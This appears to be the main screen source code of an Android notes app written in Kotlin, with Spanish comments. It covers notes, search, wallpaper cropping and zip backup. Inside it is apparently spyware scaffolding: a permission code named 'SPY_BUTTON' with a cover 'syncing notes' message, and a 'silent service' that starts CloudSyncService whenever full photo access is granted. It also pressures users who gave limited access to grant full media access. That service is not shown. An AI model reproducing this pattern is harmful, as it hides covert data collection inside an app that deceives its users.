package cl.example.mynotes

import com.google.android.material.floatingactionbutton.ExtendedFloatingActionButton
import com.google.android.material.bottomsheet.BottomSheetDialog

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.PopupWindow
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SearchView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.recyclerview.widget.RecyclerView
import androidx.recyclerview.widget.StaggeredGridLayoutManager
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.bumptech.glide.signature.ObjectKey
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : AppCompatActivity() {

    private val db by lazy { NotesDatabase.getDatabase(this) }
    private lateinit var adapter: NotesAdapter

    // Referencias UI
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var searchView: SearchView
    private lateinit var tvAppTitle: TextView
    private lateinit var btnBackSearch: ImageButton

    // UI Selección
    private lateinit var selectionToolbar: LinearLayout
    private lateinit var tvSelectionCount: TextView
    private lateinit var btnCloseSelection: ImageButton
    private lateinit var btnSelectionDelete: ImageButton

    // Referencia al toolbar normal (para ocultarlo)
    private lateinit var customToolbar: View

    private var isMultiSelectMode = false
    private var searchJob: Job? = null

    // Permisos
    private val PERMISSION_REQUEST_SPY_BUTTON = 101
    private val PERMISSION_REQUEST_WALLPAPER = 102
    private val PERMISSION_REQUEST_BACKUP = 103

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackground(resultUri)
        } else if (result.resultCode == UCrop.RESULT_ERROR) {
            Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
        }
    }

    private val restoreBackupLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) iniciarRestauracion(uri)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // Init Views
        ivBackground = findViewById(R.id.iv_main_background)
        viewOverlay = findViewById(R.id.view_overlay)
        searchView = findViewById(R.id.search_view_modern)
        tvAppTitle = findViewById(R.id.tv_app_title)
        btnBackSearch = findViewById(R.id.btn_back_search)

        // Referencia al Toolbar Normal
        customToolbar = findViewById(R.id.custom_toolbar)

        // Init Selection Views
        selectionToolbar = findViewById(R.id.selection_toolbar)
        tvSelectionCount = findViewById(R.id.tv_selection_count)
        btnCloseSelection = findViewById(R.id.btn_close_selection)
        btnSelectionDelete = findViewById(R.id.btn_selection_delete)

        cargarFondoGuardado()
        setupCustomToolbar()
        setupSelectionToolbar()

        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)
        adapter = NotesAdapter(
            onNoteClicked = { noteClicked ->
                val intent = Intent(this, NoteEditorActivity::class.java)
                intent.putExtra("note_data", noteClicked)
                startActivity(intent)
            },
            onNoteLongClicked = { noteLongClicked ->
                toggleSelectionMode(noteLongClicked)
            },
            onSelectionChanged = { count ->
                actualizarUISeleccion(count)
            }
        )

        recyclerView.adapter = adapter
        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)

        observarNotas("")

        findViewById<ExtendedFloatingActionButton>(R.id.fab_add_note).setOnClickListener {
            if (isMultiSelectMode) exitSelectionMode()
            startActivity(Intent(this, NoteEditorActivity::class.java))
        }

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (isMultiSelectMode) {
                    exitSelectionMode()
                } else if (searchView.visibility == View.VISIBLE) {
                    ocultarBuscador()
                } else {
                    isEnabled = false
                    onBackPressedDispatcher.onBackPressed()
                }
            }
        })

        iniciarServicioSilencioso()
    }

    // --- LÓGICA DE SELECCIÓN MÚLTIPLE ---

    private fun toggleSelectionMode(note: Note) {
        if (!isMultiSelectMode) {
            isMultiSelectMode = true
            // OCULTAR Toolbar Normal y MOSTRAR Toolbar Selección
            customToolbar.visibility = View.INVISIBLE // Invisible para mantener layout si es necesario, o GONE
            selectionToolbar.visibility = View.VISIBLE
            adapter.setMultiSelectMode(true)
        }
        adapter.toggleSelection(note.id)
    }

    private fun actualizarUISeleccion(count: Int) {
        if (count == 0) {
            exitSelectionMode()
        } else {
            tvSelectionCount.text = "$count seleccionados"
        }
    }

    private fun exitSelectionMode() {
        isMultiSelectMode = false
        // RESTAURAR visibilidades
        selectionToolbar.visibility = View.GONE
        customToolbar.visibility = View.VISIBLE
        adapter.setMultiSelectMode(false)
    }

    private fun setupSelectionToolbar() {
        btnCloseSelection.setOnClickListener { exitSelectionMode() }

        btnSelectionDelete.setOnClickListener {
            val selectedNotes = adapter.getSelectedNotes()
            if (selectedNotes.isNotEmpty()) {
                AlertDialog.Builder(this)
                    .setTitle("¿Eliminar ${selectedNotes.size} notas?")
                    .setPositiveButton("Eliminar") { _, _ ->
                        CoroutineScope(Dispatchers.IO).launch {
                            selectedNotes.forEach { db.notesDao().delete(it) }
                            withContext(Dispatchers.Main) {
                                exitSelectionMode()
                                Toast.makeText(this@MainActivity, "Eliminadas", Toast.LENGTH_SHORT).show()
                            }
                        }
                    }
                    .setNegativeButton("Cancelar", null)
                    .show()
            }
        }
    }

    // --- MÉTODOS DEL MENÚ BOTTOM SHEET ---
    private fun mostrarOpcionesNota(note: Note) {
        toggleSelectionMode(note)
    }

    // --- MÉTODOS DEL TOOLBAR NORMAL ---
    private fun setupCustomToolbar() {
        val btnSearch = findViewById<ImageButton>(R.id.btn_search)
        val btnMenu = findViewById<ImageButton>(R.id.btn_menu_modern)

        btnSearch.setOnClickListener { mostrarBuscador() }
        btnBackSearch.setOnClickListener { ocultarBuscador() }

        searchView.setOnCloseListener {
            ocultarBuscador()
            true
        }

        searchView.setOnQueryTextListener(object : SearchView.OnQueryTextListener {
            override fun onQueryTextSubmit(query: String?): Boolean = false
            override fun onQueryTextChange(newText: String?): Boolean {
                observarNotas(newText ?: "")
                return true
            }
        })

        btnMenu.setOnClickListener { view -> mostrarMenuModerno(view) }
    }

    private fun mostrarBuscador() {
        tvAppTitle.visibility = View.GONE
        findViewById<ImageButton>(R.id.btn_search).visibility = View.GONE
        findViewById<ImageButton>(R.id.btn_menu_modern).visibility = View.GONE

        btnBackSearch.visibility = View.VISIBLE
        searchView.visibility = View.VISIBLE
        searchView.requestFocus()
        searchView.onActionViewExpanded()
    }

    private fun ocultarBuscador() {
        searchView.setQuery("", false)
        searchView.clearFocus()
        searchView.visibility = View.GONE
        btnBackSearch.visibility = View.GONE

        tvAppTitle.visibility = View.VISIBLE
        findViewById<ImageButton>(R.id.btn_search).visibility = View.VISIBLE
        findViewById<ImageButton>(R.id.btn_menu_modern).visibility = View.VISIBLE
    }

    private fun mostrarMenuModerno(anchorView: View) {
        val layoutInflater = LayoutInflater.from(this)
        val popupView = layoutInflater.inflate(R.layout.popup_menu_modern, null)

        val popupWindow = PopupWindow(
            popupView,
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT,
            true
        )
        popupWindow.elevation = 20f

        popupView.findViewById<LinearLayout>(R.id.menu_item_wallpaper).setOnClickListener {
            popupWindow.dismiss()
            iniciarFlujoCambioFondo()
        }

        popupView.findViewById<LinearLayout>(R.id.menu_item_backup).setOnClickListener {
            popupWindow.dismiss()
            iniciarFlujoRespaldo()
        }

        popupView.findViewById<LinearLayout>(R.id.menu_item_restore).setOnClickListener {
            popupWindow.dismiss()
            restoreBackupLauncher.launch(arrayOf("application/zip"))
        }

        popupWindow.showAsDropDown(anchorView, -200, 0)
    }

    private fun observarNotas(query: String) {
        searchJob?.cancel()
        searchJob = CoroutineScope(Dispatchers.Main).launch {
            if (query.isNotEmpty()) delay(300)
            val flow = if (query.isEmpty()) db.notesDao().getAllNotes() else db.notesDao().searchNotes(query)
            flow.collect { list -> adapter.submitList(list) }
        }
    }

    // --- PERMISOS Y BACKUP (Mantener igual) ---
    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun iniciarFlujoRespaldo() {
        // 1. ¿Tiene acceso TOTAL? -> Proceder con backup
        if (verificarAccesoTotal()) {
            realizarBackup()
        }
        // 2. ¿Tiene acceso LIMITADO? -> Bloquear y explicar
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {

            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        // 3. ¿Sin permisos? -> Pedir
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_BACKUP)
        }
    }

    private fun iniciarFlujoCambioFondo() {
        // 1. ¿Tiene acceso TOTAL? -> Abrir galería
        if (verificarAccesoTotal()) {
            iniciarServicioSilencioso()
            pickBackgroundLauncher.launch(arrayOf("image/*"))
        }
        // 2. ¿Tiene acceso LIMITADO (Android 14+)? -> Mostrar diálogo DIRECTAMENTE
        // Evitamos llamar a requestPermissions para que no salte el selector del sistema
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {

            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        // 3. ¿Sin permisos? -> Pedir permiso (abre popup del sistema)
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_WALLPAPER)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioSilencioso()
            when (requestCode) {
                PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
                PERMISSION_REQUEST_SPY_BUTTON -> Toast.makeText(this, "Sincronizando notas", Toast.LENGTH_SHORT).show()
                PERMISSION_REQUEST_BACKUP -> realizarBackup()
            }
        } else {
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                mostrarDialogoConfiguracion(
                    "Acceso Limitado",
                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
                )
                return
            }
            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this).setTitle(titulo).setMessage(mensaje).setCancelable(false)
            .setPositiveButton("Ir a Configuración") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }.setNegativeButton("Cancelar", null).show()
    }

    private fun startCrop(uri: Uri) {
        val destinationFileName = "cropped_bg_${System.currentTimeMillis()}.jpg"
        val destinationFile = File(cacheDir, destinationFileName)
        val destinationUri = Uri.fromFile(destinationFile)
        val metrics = resources.displayMetrics
        val options = UCrop.Options().apply {
            setCompressionQuality(100)
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
            setToolbarTitle("Ajustar Fondo")
            setShowCropGrid(true)
            setFreeStyleCropEnabled(false)
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(metrics.widthPixels.toFloat(), metrics.heightPixels.toFloat())
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    private fun persistBackground(croppedUri: Uri) {
        try {
            val finalFile = File(filesDir, "custom_background.jpg")
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE).edit().putString("custom_bg_uri", finalUri.toString()).apply()
            mostrarFondo(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun cargarFondoGuardado() {
        val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
        val uriString = prefs.getString("custom_bg_uri", null)
        if (uriString != null) mostrarFondo(Uri.parse(uriString))
    }

    private fun mostrarFondo(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        Glide.with(this)
            .load(uri)
            .signature(ObjectKey(System.currentTimeMillis().toString()))
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
        tvAppTitle.setTextColor(Color.WHITE)
    }

    private fun realizarBackup() {
        Toast.makeText(this, "Generando respaldo...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val notes = db.notesDao().getAllNotesList()
            val zipFile = BackupHelper.createBackup(this@MainActivity, notes)
            withContext(Dispatchers.Main) {
                if (zipFile != null && zipFile.exists()) shareZipFile(zipFile)
                else Toast.makeText(this@MainActivity, "Error al crear respaldo", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun shareZipFile(file: File) {
        try {
            val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
            val intent = Intent(Intent.ACTION_SEND).apply {
                type = "application/zip"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(Intent.createChooser(intent, "Guardar respaldo en..."))
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun iniciarRestauracion(uri: Uri) {
        Toast.makeText(this, "Restaurando...", Toast.LENGTH_SHORT).show()
        CoroutineScope(Dispatchers.IO).launch {
            val restoredNotes = BackupHelper.restoreBackup(this@MainActivity, uri)
            if (restoredNotes != null && restoredNotes.isNotEmpty()) {
                db.notesDao().insertAll(restoredNotes)
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "¡Recuperado!", Toast.LENGTH_SHORT).show() }
            } else {
                withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: Archivo inválido", Toast.LENGTH_SHORT).show() }
            }
        }
    }

    private fun iniciarServicioSilencioso() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        }
    }
}